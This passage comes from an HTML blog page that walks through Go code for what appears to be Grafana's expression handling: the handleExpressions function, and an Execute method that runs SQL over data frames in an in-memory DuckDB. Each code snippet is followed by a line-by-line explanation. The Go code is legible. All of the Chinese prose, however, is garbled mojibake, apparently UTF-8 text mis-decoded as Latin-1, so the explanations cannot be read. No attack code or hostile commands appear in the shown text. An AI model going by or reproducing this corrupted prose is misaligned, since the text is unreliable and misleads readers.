ä¼šå£°æ˜ä¸€ä¸ªæ–°çš„å˜é‡ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºå³ä¾§è¡¨è¾¾å¼çš„å€¼ã€‚å¦‚æœå˜é‡å·²ç»å£°æ˜è¿‡ï¼Œ<code>:=</code> åˆ™åªä¼šç»™è¯¥å˜é‡èµ‹å€¼ã€‚</p><p>åœ¨Goè¯­è¨€ä¸­ï¼Œå®šä¹‰æ–¹æ³•ï¼ˆmethodï¼‰çš„è¯­æ³•éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><ol><li><strong>æ¥æ”¶è€…ï¼ˆReceiverï¼‰</strong>ï¼šæ–¹æ³•å¯ä»¥æœ‰é›¶ä¸ªæˆ–å¤šä¸ªæ¥æ”¶è€…ã€‚æ¥æ”¶è€…å®šä¹‰äº†æ–¹æ³•æ˜¯å±äºå“ªä¸ªç±»å‹çš„ã€‚</li><li><strong>æ–¹æ³•å</strong>ï¼šæ–¹æ³•åå¿…é¡»ä»¥å¤§å†™å­—æ¯å¼€å¤´ï¼Œä»¥ä¾¿åœ¨åŒ…å¤–å¯è§ï¼ˆå¯¼å‡ºï¼‰ã€‚</li><li><strong>å‚æ•°åˆ—è¡¨</strong>ï¼šå‚æ•°åˆ—è¡¨å®šä¹‰äº†æ–¹æ³•æ¥å—çš„å‚æ•°ã€‚</li><li><strong>è¿”å›ç±»å‹</strong>ï¼šæ–¹æ³•å¯ä»¥æœ‰é›¶ä¸ªæˆ–å¤šä¸ªè¿”å›å€¼ï¼ŒåŒ…æ‹¬è¿”å›å€¼çš„ç±»å‹ã€‚</li><li><strong>æ–¹æ³•ä½“</strong>ï¼šæ–¹æ³•çš„å®ç°éƒ¨åˆ†ã€‚</li></ol></blockquote><h3 id="3-2-2-handleExpressionså‡½æ•°"><a href="#3-2-2-handleExpressionså‡½æ•°" class="headerlink" title="3.2.2 handleExpressionså‡½æ•°"></a>3.2.2 handleExpressionså‡½æ•°</h3><p>handleExpressionså‡½æ•°çš„å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// handleExpressions handles POST /api/ds/query when there is an expression.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>ServiceImpl<span class="token punctuation">)</span> <span class="token function">handleExpressions</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> user identity<span class="token punctuation">.</span>Requester<span class="token punctuation">,</span> parsedReq <span class="token operator">*</span>parsedRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>backend<span class="token punctuation">.</span>QueryDataResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>exprReq <span class="token operator">:=</span> expr<span class="token punctuation">.</span>Request<span class="token punctuation">{</span>Queries<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">if</span> user <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> <span class="token comment">// for passthrough authentication, SSE does not authenticate</span>exprReq<span class="token punctuation">.</span>User <span class="token operator">=</span> userexprReq<span class="token punctuation">.</span>OrgId <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">GetOrgID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> pq <span class="token operator">:=</span> <span class="token keyword">range</span> parsedReq<span class="token punctuation">.</span><span class="token function">getFlattenedQueries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> pq<span class="token punctuation">.</span>datasource <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrMissingDataSourceInfo<span class="token punctuation">.</span><span class="token function">Build</span><span class="token punctuation">(</span>errutil<span class="token punctuation">.</span>TemplateData<span class="token punctuation">{</span>Public<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>any<span class="token punctuation">{</span><span class="token string">"RefId"</span><span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exprReq<span class="token punctuation">.</span>Queries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>exprReq<span class="token punctuation">.</span>Queries<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span>JSON<span class="token punctuation">:</span>          pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>JSON<span class="token punctuation">,</span>Interval<span class="token punctuation">:</span>      pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Interval<span class="token punctuation">,</span>RefID<span class="token punctuation">:</span>         pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>MaxDataPoints<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>MaxDataPoints<span class="token punctuation">,</span>QueryType<span class="token punctuation">:</span>     pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>QueryType<span class="token punctuation">,</span>DataSource<span class="token punctuation">:</span>    pq<span class="token punctuation">.</span>datasource<span class="token punctuation">,</span>TimeRange<span class="token punctuation">:</span> expr<span class="token punctuation">.</span>AbsoluteTimeRange<span class="token punctuation">{</span>From<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>From<span class="token punctuation">,</span>To<span class="token punctuation">:</span>   pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>To<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>qdr<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span> <span class="token comment">// use time now because all queries have absolute time range</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"expression request error: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> qdr<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»£ç åˆ†æï¼š</p><blockquote><h3 id="æ–¹æ³•ç­¾å"><a href="#æ–¹æ³•ç­¾å" class="headerlink" title="æ–¹æ³•ç­¾å"></a>æ–¹æ³•ç­¾å</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>ServiceImpl<span class="token punctuation">)</span> <span class="token function">handleExpressions</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> user identity<span class="token punctuation">.</span>Requester<span class="token punctuation">,</span> parsedReq <span class="token operator">*</span>parsedRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>backend<span class="token punctuation">.</span>QueryDataResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>æ¥æ”¶è€…</strong>ï¼š<code>s *ServiceImpl</code> è¡¨ç¤ºè¿™ä¸ªæ–¹æ³•æ˜¯ <code>ServiceImpl</code> ç»“æ„ä½“çš„ä¸€ä¸ªæ–¹æ³•ï¼Œ<code>s</code> æ˜¯è¯¥ç»“æ„ä½“çš„æŒ‡é’ˆã€‚</li><li>å‚æ•°ï¼š<ul><li><code>ctx context.Context</code>ï¼šç”¨äºä¼ é€’ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œé€šå¸¸ç”¨äºæ§åˆ¶è¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸå’Œå¤„ç†è¶…æ—¶ã€‚</li><li><code>user identity.Requester</code>ï¼šè¡¨ç¤ºè¯·æ±‚çš„ç”¨æˆ·ï¼Œé€šå¸¸åŒ…å«ç”¨æˆ·çš„ä¿¡æ¯å’Œæƒé™ã€‚</li><li><code>parsedReq *parsedRequest</code>ï¼šè¡¨ç¤ºè§£æåçš„è¯·æ±‚ï¼ŒåŒ…å«æŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯ã€‚</li></ul></li><li><strong>è¿”å›å€¼</strong>ï¼šè¿”å›ä¸€ä¸ªæŒ‡å‘ <code>backend.QueryDataResponse</code> çš„æŒ‡é’ˆå’Œä¸€ä¸ª <code>error</code>ï¼Œè¡¨ç¤ºå¤„ç†ç»“æœå’Œå¯èƒ½çš„é”™è¯¯ã€‚</li></ul><h3 id="åˆå§‹åŒ–è¡¨è¾¾å¼è¯·æ±‚ï¼š"><a href="#åˆå§‹åŒ–è¡¨è¾¾å¼è¯·æ±‚ï¼š" class="headerlink" title="åˆå§‹åŒ–è¡¨è¾¾å¼è¯·æ±‚ï¼š"></a><strong>åˆå§‹åŒ–è¡¨è¾¾å¼è¯·æ±‚</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">exprReq <span class="token operator">:=</span> expr<span class="token punctuation">.</span>Request<span class="token punctuation">{</span>    Queries<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºä¸€ä¸ªæ–°çš„è¡¨è¾¾å¼è¯·æ±‚ <code>exprReq</code>ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç©ºçš„æŸ¥è¯¢åˆ—è¡¨ã€‚</p><h3 id="ç”¨æˆ·ä¿¡æ¯å¤„ç†ï¼š"><a href="#ç”¨æˆ·ä¿¡æ¯å¤„ç†ï¼š" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯å¤„ç†ï¼š"></a><strong>ç”¨æˆ·ä¿¡æ¯å¤„ç†</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> user <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>    exprReq<span class="token punctuation">.</span>User <span class="token operator">=</span> user    exprReq<span class="token punctuation">.</span>OrgId <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">GetOrgID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœç”¨æˆ·ä¸ä¸º <code>nil</code>ï¼Œåˆ™å°†ç”¨æˆ·ä¿¡æ¯å’Œç»„ç»‡IDæ·»åŠ åˆ° <code>exprReq</code> ä¸­ã€‚è¿™é€šå¸¸ç”¨äºèº«ä»½éªŒè¯å’Œæˆæƒã€‚</p><h3 id="å¤„ç†è§£æåçš„æŸ¥è¯¢ï¼š"><a href="#å¤„ç†è§£æåçš„æŸ¥è¯¢ï¼š" class="headerlink" title="å¤„ç†è§£æåçš„æŸ¥è¯¢ï¼š"></a><strong>å¤„ç†è§£æåçš„æŸ¥è¯¢</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> pq <span class="token operator">:=</span> <span class="token keyword">range</span> parsedReq<span class="token punctuation">.</span><span class="token function">getFlattenedQueries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> pq<span class="token punctuation">.</span>datasource <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrMissingDataSourceInfo<span class="token punctuation">.</span><span class="token function">Build</span><span class="token punctuation">(</span>errutil<span class="token punctuation">.</span>TemplateData<span class="token punctuation">{</span>            Public<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>any<span class="token punctuation">{</span>                <span class="token string">"RefId"</span><span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éå†è§£æåçš„æŸ¥è¯¢ <code>parsedReq.getFlattenedQueries()</code>ï¼Œå¯¹äºæ¯ä¸ªæŸ¥è¯¢ï¼š</p><ul><li>æ£€æŸ¥æ•°æ®æºæ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæ•°æ®æºä¸º <code>nil</code>ï¼Œåˆ™è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œè¡¨æ˜ç¼ºå°‘æ•°æ®æºä¿¡æ¯ã€‚</li></ul><h3 id="æ„å»ºæŸ¥è¯¢ï¼š"><a href="#æ„å»ºæŸ¥è¯¢ï¼š" class="headerlink" title="æ„å»ºæŸ¥è¯¢ï¼š"></a><strong>æ„å»ºæŸ¥è¯¢</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">exprReq<span class="token punctuation">.</span>Queries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>exprReq<span class="token punctuation">.</span>Queries<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span>    JSON<span class="token punctuation">:</span>          pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>JSON<span class="token punctuation">,</span>    Interval<span class="token punctuation">:</span>      pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Interval<span class="token punctuation">,</span>    RefID<span class="token punctuation">:</span>         pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>    MaxDataPoints<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>MaxDataPoints<span class="token punctuation">,</span>    QueryType<span class="token punctuation">:</span>     pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>QueryType<span class="token punctuation">,</span>    DataSource<span class="token punctuation">:</span>    pq<span class="token punctuation">.</span>datasource<span class="token punctuation">,</span>    TimeRange<span class="token punctuation">:</span> expr<span class="token punctuation">.</span>AbsoluteTimeRange<span class="token punctuation">{</span>        From<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>From<span class="token punctuation">,</span>        To<span class="token punctuation">:</span>   pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>To<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†æ¯ä¸ªæŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯æ·»åŠ åˆ° <code>exprReq.Queries</code> ä¸­ï¼ŒåŒ…æ‹¬æŸ¥è¯¢çš„JSONã€æ—¶é—´èŒƒå›´ã€æ•°æ®æºç­‰ã€‚</p><h3 id="è°ƒç”¨è¡¨è¾¾å¼æœåŠ¡ï¼š"><a href="#è°ƒç”¨è¡¨è¾¾å¼æœåŠ¡ï¼š" class="headerlink" title="è°ƒç”¨è¡¨è¾¾å¼æœåŠ¡ï¼š"></a><strong>è°ƒç”¨è¡¨è¾¾å¼æœåŠ¡</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">qdr<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è°ƒç”¨ <code>expressionService</code> çš„ <code>TransformData</code> æ–¹æ³•ï¼Œå°†å½“å‰æ—¶é—´å’Œæ„å»ºçš„è¡¨è¾¾å¼è¯·æ±‚ä¼ é€’ç»™å®ƒã€‚è¿™ä¸ªæ–¹æ³•ä¼šå¤„ç†æŸ¥è¯¢å¹¶è¿”å›ç»“æœã€‚</p><h3 id="é”™è¯¯å¤„ç†ï¼š"><a href="#é”™è¯¯å¤„ç†ï¼š" class="headerlink" title="é”™è¯¯å¤„ç†ï¼š"></a><strong>é”™è¯¯å¤„ç†</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"expression request error: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœåœ¨è°ƒç”¨ <code>TransformData</code> æ—¶å‘ç”Ÿé”™è¯¯ï¼Œè¿”å›ä¸€ä¸ªæ ¼å¼åŒ–çš„é”™è¯¯ä¿¡æ¯ã€‚</p><h3 id="è¿”å›ç»“æœï¼š"><a href="#è¿”å›ç»“æœï¼š" class="headerlink" title="è¿”å›ç»“æœï¼š"></a><strong>è¿”å›ç»“æœ</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">return</span> qdr<span class="token punctuation">,</span> <span class="token boolean">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œè¿”å›æŸ¥è¯¢æ•°æ®å“åº” <code>qdr</code> å’Œ <code>nil</code>ï¼ˆè¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼‰ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™ä¸ªæ–¹æ³•çš„ä¸»è¦åŠŸèƒ½æ˜¯å¤„ç†è¡¨è¾¾å¼æŸ¥è¯¢è¯·æ±‚ï¼ŒéªŒè¯ç”¨æˆ·ä¿¡æ¯ï¼Œæ„å»ºæŸ¥è¯¢è¯·æ±‚ï¼Œè°ƒç”¨æœåŠ¡å¤„ç†æŸ¥è¯¢ï¼Œå¹¶è¿”å›ç»“æœæˆ–é”™è¯¯ã€‚å®ƒå±•ç¤ºäº†Goè¯­è¨€ä¸­å¦‚ä½•å¤„ç†HTTPè¯·æ±‚ã€ä¸Šä¸‹æ–‡ç®¡ç†ã€é”™è¯¯å¤„ç†å’Œæ•°æ®ç»“æ„çš„ä½¿ç”¨ã€‚</p></blockquote><p>æ‰€ä»¥æ ¸å¿ƒä»£ç è°ƒç”¨äº†è¡¨è¾¾å¼æœåŠ¡ã€‚</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-3-Executeå‡½æ•°"><a href="#3-2-3-Executeå‡½æ•°" class="headerlink" title="3.2.3 Executeå‡½æ•°"></a>3.2.3 Executeå‡½æ•°</h3><p>æœ€ç»ˆæ‰§è¡Œsqlè¯­å¥çš„å‡½æ•°åœ¨sql_command.goä¸­</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Execute runs the command and returns the results or an error if the command</span><span class="token comment">// failed to execute.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>gr <span class="token operator">*</span>SQLCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> vars mathexp<span class="token punctuation">.</span>Vars<span class="token punctuation">,</span> tracer tracing<span class="token punctuation">.</span>Tracer<span class="token punctuation">)</span> <span class="token punctuation">(</span>mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> span <span class="token operator">:=</span> tracer<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token string">"SSE.ExecuteSQL"</span><span class="token punctuation">)</span><span class="token keyword">defer</span> span<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span>allFrames <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> ref <span class="token operator">:=</span> <span class="token keyword">range</span> gr<span class="token punctuation">.</span>varsToQuery <span class="token punctuation">{</span>results<span class="token punctuation">,</span> ok <span class="token operator">:=</span> vars<span class="token punctuation">[</span>ref<span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>logger<span class="token punctuation">.</span><span class="token function">Warn</span><span class="token punctuation">(</span><span class="token string">"no results found for"</span><span class="token punctuation">,</span> <span class="token string">"ref"</span><span class="token punctuation">,</span> ref<span class="token punctuation">)</span><span class="token keyword">continue</span><span class="token punctuation">}</span>frames <span class="token operator">:=</span> results<span class="token punctuation">.</span>Values<span class="token punctuation">.</span><span class="token function">AsDataFrames</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span>allFrames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">,</span> frames<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">}</span>rsp <span class="token operator">:=</span> mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">{</span><span class="token punctuation">}</span>duckDB <span class="token operator">:=</span> duck<span class="token punctuation">.</span><span class="token function">NewInMemoryDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> frame <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>logger<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token string">"Failed to query frames"</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rsp<span class="token punctuation">.</span>Error <span class="token operator">=</span> err<span class="token keyword">return</span> rsp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Done Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"rows"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>RefID <span class="token operator">=</span> gr<span class="token punctuation">.</span>refID<span class="token keyword">if</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>mathexp<span class="token punctuation">.</span>NoData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>mathexp<span class="token punctuation">.</span>TableData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">return</span> rsp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="æ–¹æ³•ç­¾å-1"><a href="#æ–¹æ³•ç­¾å-1" class="headerlink" title="æ–¹æ³•ç­¾å"></a>æ–¹æ³•ç­¾å</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>gr <span class="token operator">*</span>SQLCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> vars mathexp<span class="token punctuation">.</span>Vars<span class="token punctuation">,</span> tracer tracing<span class="token punctuation">.</span>Tracer<span class="token punctuation">)</span> <span class="token punctuation">(</span>mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>æ¥æ”¶è€…</strong>ï¼š<code>gr *SQLCommand</code> è¡¨ç¤ºè¿™ä¸ªæ–¹æ³•æ˜¯ <code>SQLCommand</code> ç»“æ„ä½“çš„æŒ‡é’ˆæ–¹æ³•ã€‚</li><li>å‚æ•°ï¼š<ul><li><code>ctx context.Context</code>ï¼šç”¨äºä¼ é€’ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œé€šå¸¸ç”¨äºæ§åˆ¶è¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸå’Œå¤„ç†è¶…æ—¶ã€‚</li><li><code>now time.Time</code>ï¼šè¡¨ç¤ºå½“å‰æ—¶é—´ï¼Œå¯èƒ½ç”¨äºæ—¶é—´ç›¸å…³çš„æŸ¥è¯¢ã€‚</li><li><code>vars mathexp.Vars</code>ï¼šä¸€ä¸ªå˜é‡æ˜ å°„ï¼Œå¯èƒ½åŒ…å«æŸ¥è¯¢ä¸­éœ€è¦çš„å˜é‡å€¼ã€‚</li><li><code>tracer 